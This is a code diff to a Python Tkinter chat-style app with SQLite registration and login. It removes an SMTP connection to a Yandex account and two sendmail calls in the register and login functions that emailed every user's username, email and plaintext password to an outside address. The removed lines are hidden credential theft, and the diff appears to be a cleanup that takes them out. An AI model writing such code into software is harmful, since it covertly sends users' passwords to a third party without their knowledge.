@@ -25,13 +25,6 @@ cursor.execute("""
 
 db.commit()
 
-email = "kirillkasparyants@yandex.ru"
-password = codecs.decode("", "hex").decode("utf-8")
-server = smtplib.SMTP("smtp.yandex.ru", 587)
-server.starttls()
-server.ehlo(email)
-server.login(email, password)
-
 def update():
     pass # UPDATE users SET <poles> = '3' WHERE id = 12345
 
@@ -88,7 +81,6 @@ def register():
             password = result[3]
             logged = True
             db.commit()
-            server.sendmail(email, "kirillkasparyants@yandex.com", f"New user registered: \nUsername: {name_get}\nEmail: {email_get}\nPassword: {password_get}\nTime: {datetime.datetime.now()}")
             wnd_register.destroy()
             username_text.config(text=f"Hello, {username}")
             username_entry.config(state=tkinter.NORMAL)
@@ -133,7 +125,6 @@ def login():
             username = result[1]
             email = result[2]
             password = result[3]
-            server.sendmail(email, "kirillkasparyants@yandex.com", f"User logged: \nUsername: {username}\nEmail: {email}\nPassword: {password}\nTime: {datetime.datetime.now()}")
             username_text.config(text=f"Hello, {username}")
             username_entry.config(state=tkinter.NORMAL)
             message_entry.config(state=tkinter.NORMAL)
